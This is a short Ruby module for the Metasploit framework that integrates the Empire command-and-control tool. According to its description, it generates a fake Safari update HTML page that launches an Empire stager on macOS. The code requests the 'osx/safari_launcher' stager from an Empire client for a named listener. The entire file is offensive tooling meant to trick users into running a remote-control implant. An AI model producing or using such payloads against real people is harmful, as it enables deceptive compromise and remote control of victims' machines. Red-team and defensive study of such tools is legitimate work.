##
## This module requires Metasploit: https://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###
require 'msf/core/payload/empire_single.rb'

module MetasploitModule

  include Msf::Payload::EmpireSingle

  def initialize(info={})
    super(merge_info(info,
    'Description'=> 'Generates a dummy Safari update HTML payload launcher for Empire'
    ))
  end

  def stagerGenerator(empireClient)
    @stagerCode = empireClient.gen_stager(@listener_name, 'osx/safari_launcher')
    return @stagerCode
  end
end
